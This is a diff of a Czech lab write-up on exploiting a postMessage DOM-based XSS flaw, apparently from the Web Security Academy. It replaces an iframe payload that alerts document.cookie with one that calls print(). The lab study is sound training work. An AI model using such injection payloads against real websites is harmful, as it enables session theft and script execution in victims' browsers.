@@ -20,8 +20,7 @@ Aplikace přicházející zprávu zpracovala a nebezpečným způsobem ji vloži
 
 
   ```html
-<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=alert(document.cookie)>','*')">
-</iframe>
+<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
 
 
 Uložení (Store): Nastavení jsem uložil kliknutím na tlačítko Store[cite: 5].
